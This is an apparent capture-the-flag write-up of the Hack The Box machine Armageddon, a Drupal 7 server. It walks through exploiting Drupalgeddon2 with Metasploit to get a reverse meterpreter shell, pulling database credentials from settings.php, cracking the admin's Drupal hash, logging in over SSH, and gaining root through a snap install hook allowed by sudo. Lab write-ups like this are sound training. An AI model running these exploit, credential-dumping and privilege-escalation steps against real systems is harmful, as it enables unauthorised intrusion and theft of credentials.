### Armageddon HTB

### Difficulty = Easy

### IP Address = 10.10.10.233

Nmap Scan: 

```
┌──(mark__haxor)-[~]
└─$ nmap -sCV -A 10.10.10.233 -p22,80 -oN nmapscan                                     
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-22 04:30 WAT
Stats: 0:00:02 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 04:30 (0:00:06 remaining)
Nmap scan report for 10.10.10.233
Host is up (0.43s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: Welcome to  Armageddon |  Armageddon
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-generator: Drupal 7 (http://drupal.org)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.32 seconds
```

Only two ports open which are ssh and http

Nmap have also been able to identify the http content of the web server

And from the result we can tell its running Drupal 7

We can confirm using wappalyzer 
![image](https://user-images.githubusercontent.com/113513376/214134798-4d2e8af3-8ab8-42b2-9f33-a61b3919ac21.png)

![image](https://user-images.githubusercontent.com/113513376/214134925-86a248f4-e209-4ce7-8830-c4aabcac7929.png)


Since its running drupal 7 i then searched for exploit and found this https://github.com/immunIT/drupwn

So lets try it out

```
┌──(mark__haxor)-[~/Desktop/Tools/drupwn]
└─$ python3 drupwn --help

        ____
       / __ \_______  ______ _      ______
      / / / / ___/ / / / __ \ | /| / / __ \
     / /_/ / /  / /_/ / /_/ / |/ |/ / / / /
    /_____/_/   \__,_/ .___/|__/|__/_/ /_/
                     /_/
    
usage: drupwn [-h] [--mode MODE] [--target TARGET] [--users] [--nodes] [--modules] [--dfiles] [--themes] [--version VERSION] [--cookies COOKIES] [--thread THREAD] [--range RANGE] [--ua UA] [--bauth BAUTH]
              [--delay DELAY] [--log] [--update] [--proxy PROXY | --proxies PROXIES]

Drupwn aims to automate drupal information gathering.

options:
  -h, --help         show this help message and exit
  --mode MODE        enum|exploit
  --target TARGET    hostname to scan
  --users            user enumaration
  --nodes            node enumeration
  --modules          module enumeration
  --dfiles           default files enumeration
  --themes           theme enumeration
  --version VERSION  Drupal version
  --cookies COOKIES  cookies
  --thread THREAD    threads number
  --range RANGE      enumeration range
  --ua UA            User Agent
  --bauth BAUTH      Basic authentication
  --delay DELAY      request delay
  --log              file logging
  --update           update plugins and themes
  --proxy PROXY      [http|https|socks]://host:port
  --proxies PROXIES  Proxies file
```

So lets test the exploit out

```
                                                                                                                                                                                                           [28/42]
┌──(mark__haxor)-[~/Desktop/Tools/drupwn]                                                                                                                                                                         
└─$ python3 drupwn --mode exploit --target http://10.10.10.233/ --proxy http://127.0.0.1:8080                                                                                                                     
                                                                                                                                                                                                                  
        ____                                                                                                                                                                                                      
       / __ \_______  ______ _      ______                                                                                                                                                                        
      / / / / ___/ / / / __ \ | /| / / __ \                                                                                                                                                                       
     / /_/ / /  / /_/ / /_/ / |/ |/ / / / /                                                                                                                                                                       
    /_____/_/   \__,_/ .___/|__/|__/_/ /_/                                                                                                                                                                        
                     /_/                                                                                                                                                                                          
                                                                                                                                                                                                                  
[-] Version not specified, trying to identify it                                                                                                                                                                  
                                                                                                                                                                                                                  
[+] Version detected: 8.x                                                                                                                                                                                         
                                                                                                                                                                                                                  
Commands available: list | quit | check [CVE_NUMBER] | exploit [CVE_NUMBER]                                                                                                                                       
                                                                                                                                                                                                                  
Drupwn> list                                                                                                                                                                                                      
+---------------+----------------------------------------+---------------------------------+                                                                                                                      
|      CVE      |              Description               |        Versions affected        |                                                                                                                      
+---------------+----------------------------------------+---------------------------------+                                                                                                                      
| CVE-2018-7600 |        Remote Command Execution        |      7.x < 7.58 & 8.x < 8.1     |                                                                                                                      
| CVE-2019-6340 |        Remote Command Execution        | 8.5.x < 8.5.11 & 8.6.x < 8.6.10 |                                                                                                                      
| CVE-2018-7602 | Authenticated Remote Command Execution |           7.x <= 7.58           |                                                                                                                      
+---------------+----------------------------------------+---------------------------------+                                                                                                                      
                                                                                                                                                                                                                  
Drupwn> exploit CVE-2019-6340                                                                                                                                                                                     
                                                                                                                                                                                                                  
[*] 0 nodes has been found. Starting upstream enumeration to increase the success ratio...                                                                                                                        
                                                                                                                                                                                                                  
Drupwn> 
```

It failed cause it says no nodes found 

I'll set the proxy option and see whats happening

```
┌──(mark__haxor)-[~/Desktop/Tools/drupwn]
└─$ python3 drupwn --mode exploit --target http://10.10.10.233 --proxy http://127.0.0.1:8080 

        ____
       / __ \_______  ______ _      ______
      / / / / ___/ / / / __ \ | /| / / __ \
     / /_/ / /  / /_/ / /_/ / |/ |/ / / / /
    /_____/_/   \__,_/ .___/|__/|__/_/ /_/
                     /_/
    
[-] Version not specified, trying to identify it

[+] Version detected: 8.x

Commands available: list | quit | check [CVE_NUMBER] | exploit [CVE_NUMBER]

Drupwn> exploit CVE-2019-6340

[*] 0 nodes has been found. Starting upstream enumeration to increase the success ratio...

```

Back on burp suite we see it attempting to find a node but there's really no node
![image](https://user-images.githubusercontent.com/113513376/214138434-850eb300-469a-4a27-a7a9-96c18a0878e4.png)

I have no idea why this is happening anyways i'll switch to metasploit to use and exploit this box

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Armageddon]
└─$ msfconsole                                            
                                                  
                                   ___          ____
                               ,-""   `.      < HONK >
                             ,'  _   e )`-._ /  ----
                            /  ,' `-._<.===-'
                           /  /
                          /  ;
              _          /   ;
 (`._    _.-"" ""--..__,'    |
 <_  `-""                     \
  <`-                          :
   (__   <__.                  ;
     `-.   '-.__.      _.'    /
        \      `-.__,-'    _,'
         `._    ,    /__,-'
            ""._\__,'< <____
                 | |  `----.`.
                 | |        \ `.
                 ; |___      \-``
                 \   --<
                  `.`.<
                    `-'



       =[ metasploit v6.2.9-dev                           ]
+ -- --=[ 2229 exploits - 1177 auxiliary - 398 post       ]
+ -- --=[ 867 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Use sessions -1 to interact with the 
last opened session

[*] Starting persistent handler(s)...
msf6 > 
```

Now i'll search for drupal

```
msf6 > search drupal

Matching Modules
================

   #  Name                                           Disclosure Date  Rank       Check  Description
   -  ----                                           ---------------  ----       -----  -----------
   0  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution
   1  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
   2  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection
   3  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection
   4  exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution
   5  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE
   6  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration
   7  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution


Interact with a module by name or index. For example info 7, use 7 or use exploit/unix/webapp/php_xmlrpc_eval

msf6 > 
```

So i'll use exploit 1 which is `exploit/unix/webapp/drupal_drupalgeddon2` and set the options needed then run it

```
msf6 > use 1                                                                                                                                                                                                      
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp 
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > options

Module options (exploit/unix/webapp/drupal_drupalgeddon2):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   DUMP_OUTPUT  false            no        Dump payload command output
   PHP_FUNC     passthru         yes       PHP function to execute
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT        80               yes       The target port (TCP)
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /                yes       Path to Drupal install
   VHOST                         no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.220.131  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (PHP In-Memory)


msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set rhosts 10.10.10.233
rhosts => 10.10.10.233
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set lhost tun0
lhost => tun0
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > run

[*] Started reverse TCP handler on 10.10.16.7:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Sending stage (39927 bytes) to 10.10.10.233
[*] Meterpreter session 1 opened (10.10.16.7:4444 -> 10.10.10.233:48170) at 2023-01-23 21:06:19 +0100

meterpreter > getuid
Server username: 
meterpreter > shell
Process 2371 created.
Channel 0 created.
whoami
apache
id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
```

Well that worked cool 

I'll get a more stable reverse shell but it failed 

Attempting to check the home directory failed

```
meterpreter > shell
Process 2628 created.
Channel 1 created.
ls /home
ls: cannot open directory /home: Permission denied
```

But we know there's a user on the box by checking the `/etc/passwd` file

```
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
```

The apache user is very limited to things

So lets check the drupal config file to see if we can access the drupal db

By default drupal config file is in `/var/www/html/sites/default/settings.php`

```
$databases = array (
   default' => 
  array (
     'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',                                                                                                                                             'driver' => 'mysql',                                                                                                                               
      'prefix' => '',
    ),
  ),
);
```

Now lets view the mysql db using the credential 

Since the shell isn't stablizied i'll do a one linear mysql command

```
bash-4.2$ mysql -e 'show tables;' -u drupaluser -p'CQHEy@9M*m23gBVj' drupal
Tables_in_drupal
actions
authmap
batch
block
...[snip]...
users
users_roles
variable
watchdog
```

Now we see users tables, lets dump it

```
mysql -e 'select * from users;' -u drupaluser -p'CQHEy@9M*m23gBVj' drupal
uid     name    pass    mail    theme   signature       signature_format        created access  login   status  timezone        language        picture init    data
0                                               NULL    0       0       0       0       NULL            0               NULL
1       brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt admin@armageddon.eu                     filtered_html   1606998756      1607077194      1607076276      1       Europe/London             0       admin@armageddon.eu     a:1:{s:7:"overlay";i:1;}
```

We see the user's password hash cool 

Lets brute it using jtr (john the ripper)

```
                                                                                                                                                                                                                  
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Armageddon]
└─$ nano hash
                                                                                                                                                                                                                  
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Armageddon]
└─$ john -w=/home/mark/Documents/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (Drupal7, $S$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
booboo           (?)     
1g 0:00:00:00 DONE (2023-01-23 21:41) 1.724g/s 400.0p/s 400.0c/s 400.0C/s tiffany..harley
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

The password for the user is `booboo` now lets login via ssh using the cred `brucetherealadmin:booboo`

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Armageddon]
└─$ ssh brucetherealadmin@10.10.10.233
The authenticity of host '10.10.10.233 (10.10.10.233)' can't be established.
ED25519 key fingerprint is SHA256:rMsnEyZLB6x3S3t/2SFrEG1MnMxicQ0sVs9pFhjchIQ.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.233' (ED25519) to the list of known hosts.
brucetherealadmin@10.10.10.233's password: 
Last login: Fri Mar 19 08:01:19 2021 from 10.10.14.5
[brucetherealadmin@armageddon ~]$ ls
user.txt
[brucetherealadmin@armageddon ~]$
```

Now lets escalate our privilege to root

Checking for sudo permssions shows that the user can `/usr/bin/snap install *` as root

```
[brucetherealadmin@armageddon ~]$ sudo -l
Matching Defaults entries for brucetherealadmin on armageddon:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
    LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
[brucetherealadmin@armageddon ~]$ 
```

Checking https://gtfobins.github.io/gtfobins/snap/#sudo we see what command we will run to get root 
![image](https://user-images.githubusercontent.com/113513376/214146361-7219244e-53ef-4131-a00f-0086100ff299.png)


```
COMMAND=id
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta

sudo snap install xxxx_1.0_all.snap --dangerous --devmode
```

After doing following the instructions you should get root 

And we're done

<br> <br>
[Back To Home](../../index.md)
<br>







